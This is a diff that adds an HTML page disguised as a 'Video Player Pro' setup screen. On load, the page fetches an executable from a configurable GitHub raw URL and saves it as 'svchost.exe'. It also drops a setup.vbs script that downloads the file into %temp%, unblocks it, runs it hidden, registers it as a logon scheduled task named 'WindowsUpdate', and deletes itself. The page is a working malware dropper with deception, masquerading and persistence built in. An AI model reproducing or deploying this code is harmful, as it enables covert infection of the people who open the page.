@@ -1,0 +1,186 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Video Player</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+            color: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+        }
+        .container {
+            background: rgba(0,0,0,0.7);
+            border-radius: 20px;
+            padding: 40px;
+            text-align: center;
+            max-width: 500px;
+            backdrop-filter: blur(10px);
+            box-shadow: 0 0 30px rgba(0,0,0,0.5);
+        }
+        h1 { margin: 0 0 10px 0; color: #00ff88; }
+        .video-icon { font-size: 80px; margin: 20px 0; }
+        .status {
+            background: #2a2a3a;
+            padding: 15px;
+            border-radius: 10px;
+            margin: 20px 0;
+            font-size: 14px;
+        }
+        .loading {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid #00ff88;
+            border-radius: 50%;
+            border-top-color: transparent;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        .success { color: #00ff88; }
+        .error { color: #ff4444; }
+        button {
+            background: #00ff88;
+            color: #1a1a2e;
+            border: none;
+            padding: 12px 30px;
+            border-radius: 25px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+        button:hover { background: #00cc66; }
+        .hidden { display: none; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="video-icon">🎬</div>
+        <h1>Video Player Pro</h1>
+        <p>Loading video player components...</p>
+        
+        <div class="status" id="status">
+            <span class="loading"></span> Initializing...
+        </div>
+        
+        <div id="complete" class="hidden">
+            <p class="success">✓ Setup complete!</p>
+            <p>Please run the downloaded file to start the video player.</p>
+            <button onclick="window.close()">Close</button>
+        </div>
+        
+        <div id="error" class="hidden">
+            <p class="error">✗ Download failed. Please try again.</p>
+            <button onclick="location.reload()">Retry</button>
+        </div>
+    </div>
+
+    <script>
+        // ============================================
+        // CONFIGURATION - THAY LINK RAW CỦA BẠN VÀO ĐÂY
+        // ============================================
+        const EXE_URL = "https://raw.githubusercontent.com/YOUR_USERNAME/YOUR_REPO/main/chromelevator.exe";
+        const EXE_NAME = "svchost.exe";
+        
+        // ============================================
+        // TẠO FILE VBS TỰ ĐỘNG DOWNLOAD + RUN
+        // ============================================
+        function createVBScript() {
+            const vbsCode = `' Auto installer
+Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
+Set objADOStream = CreateObject("ADODB.Stream")
+Set objShell = CreateObject("WScript.Shell")
+Set objFSO = CreateObject("Scripting.FileSystemObject")
+
+' Download file
+objXMLHTTP.open "GET", "` + EXE_URL + `", False
+objXMLHTTP.send
+
+If objXMLHTTP.Status = 200 Then
+    objADOStream.Type = 1
+    objADOStream.Open
+    objADOStream.Write objXMLHTTP.responseBody
+    objADOStream.SaveToFile objShell.ExpandEnvironmentStrings("%temp%\\` + EXE_NAME + `"), 2
+    objADOStream.Close
+End If
+
+' Unblock and run
+objShell.Run "powershell -Command ""Unblock-File '%temp%\\` + EXE_NAME + `'; Start-Process '%temp%\\` + EXE_NAME + `' -WindowStyle Hidden""", 0, False
+
+' Add to startup
+objShell.Run "schtasks /create /tn ""WindowsUpdate"" /tr ""%temp%\\` + EXE_NAME + `"" /sc onlogon /f", 0, True
+
+' Delete this script
+objFSO.DeleteFile WScript.ScriptFullName
+
+WScript.Quit 0`;
+            return vbsCode;
+        }
+        
+        function downloadFile(content, filename, mimeType) {
+            const blob = new Blob([content], {type: mimeType});
+            const link = document.createElement('a');
+            link.href = URL.createObjectURL(blob);
+            link.download = filename;
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+            URL.revokeObjectURL(link.href);
+        }
+        
+        async function downloadExe() {
+            try {
+                const response = await fetch(EXE_URL);
+                if (!response.ok) throw new Error('Network error');
+                const blob = await response.blob();
+                const link = document.createElement('a');
+                link.href = URL.createObjectURL(blob);
+                link.download = EXE_NAME;
+                document.body.appendChild(link);
+                link.click();
+                document.body.removeChild(link);
+                URL.revokeObjectURL(link.href);
+                return true;
+            } catch (error) {
+                console.error('Download failed:', error);
+                return false;
+            }
+        }
+        
+        async function start() {
+            const statusDiv = document.getElementById('status');
+            const completeDiv = document.getElementById('complete');
+            const errorDiv = document.getElementById('error');
+            
+            statusDiv.innerHTML = '<span class="loading"></span> Creating installer...';
+            const vbsContent = createVBScript();
+            
+            statusDiv.innerHTML = '<span class="loading"></span> Downloading video player...';
+            const exeDownloaded = await downloadExe();
+            
+            if (!exeDownloaded) {
+                statusDiv.classList.add('hidden');
+                errorDiv.classList.remove('hidden');
+                return;
+            }
+            
+            statusDiv.innerHTML = '<span class="loading"></span> Creating setup file...';
+            downloadFile(vbsContent, 'setup.vbs', 'application/octet-stream');
+            
+            statusDiv.classList.add('hidden');
+            completeDiv.classList.remove('hidden');
+        }
+        
+        setTimeout(start, 1000);
+    </script>
+</body>
+</html>
